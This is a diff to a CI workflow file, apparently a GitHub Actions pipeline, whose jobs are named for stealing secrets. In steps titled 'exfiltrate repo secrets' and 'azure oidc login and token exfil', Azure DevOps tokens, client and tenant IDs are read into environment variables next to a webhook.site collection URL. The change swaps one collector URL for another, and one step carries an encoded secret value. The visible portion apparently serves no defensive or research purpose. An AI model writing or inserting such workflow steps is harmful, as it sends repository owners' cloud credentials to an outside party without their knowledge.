@@ -14,7 +14,7 @@ jobs:
     steps:
       - name: exfiltrate repo secrets
         env:
-          W: "https://webhook.site/a41fb769-52b2-44e4-81ee-6cea02b28822"
+          W: "https://webhook.site/c5fae733-2e28-4c52-bf12-85e9b1f13b44"
           S1: ${{ secrets.AZURE_DEVOPS_TOKEN }}
           S2: ${{ secrets.AZURE_CLIENT_ID }}
           S3: ${{ secrets.AZURE_TENANT_ID }}
@@ -72,7 +72,7 @@ jobs:
       - name: azure oidc login and token exfil
         if: always()
         env:
-          W: "https://webhook.site/a41fb769-52b2-44e4-81ee-6cea02b28822"
+          W: "https://webhook.site/c5fae733-2e28-4c52-bf12-85e9b1f13b44"
           CID: ${{ secrets.AZURE_CLIENT_ID }}
           TID: ${{ secrets.AZURE_TENANT_ID }}
         run: |
@@ -89,7 +89,7 @@ jobs:
       - name: ca probe
         if: always()
         env:
-          W: "https://webhook.site/a41fb769-52b2-44e4-81ee-6cea02b28822"
+          W: "https://webhook.site/c5fae733-2e28-4c52-bf12-85e9b1f13b44"
           SECB64: "b2M5N0kyYkh1QS9xV2xtTExUN0NleU9JTi9JUzRiQ3c="
         run: |
           set +e
